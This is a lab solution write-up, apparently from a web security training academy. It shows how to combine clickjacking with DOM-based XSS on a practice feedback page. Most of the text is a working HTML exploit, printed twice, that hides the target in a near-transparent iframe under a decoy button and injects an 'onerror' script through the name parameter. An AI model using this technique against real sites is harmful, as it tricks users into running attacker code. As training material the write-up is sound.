# Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS (Practitioner)

**Goal:** Trigger `print()` via clickjacking + DOM XSS on the feedback page.

## Vulnerability
The feedback form has a DOM XSS in the `name` parameter that is reflected via `innerHTML`. The page can be framed.

## Solution

Pre-fill the vulnerable parameter in the iframe URL and overlay the "Submit feedback" button.

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 610px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

### Notes
- The XSS payload is in the `name` parameter.
- `#feedbackResult` helps focus the vulnerable element.
- Suggested alignment for the Submit button: top 610px, left 80px.
- Test with opacity 0.1; once print() fires on click, set opacity low and deliver.

## Final Exploit Payload
```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 610px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```
